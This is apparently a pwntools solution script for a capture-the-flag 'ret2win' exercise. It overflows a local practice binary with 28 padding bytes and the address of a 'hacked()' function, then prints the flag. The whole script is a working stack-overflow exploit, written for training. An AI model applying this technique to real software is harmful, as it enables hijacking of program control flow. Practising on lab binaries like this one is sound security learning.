#!/bin/python3
from pwn import *

# Set up pwntools for the correct architecture
exe = './ret2win'

io = process(exe)

# How many bytes to the instruction pointer (EIP)?
padding = 28

payload = flat(
    b'A' * 28,
    0x08049182 #hacked()
)

# Send the payload
io.sendlineafter(b':', payload)

io.recvline()
io.recvline()

print(io.recvline().decode())

# Receive the flag
io.close()
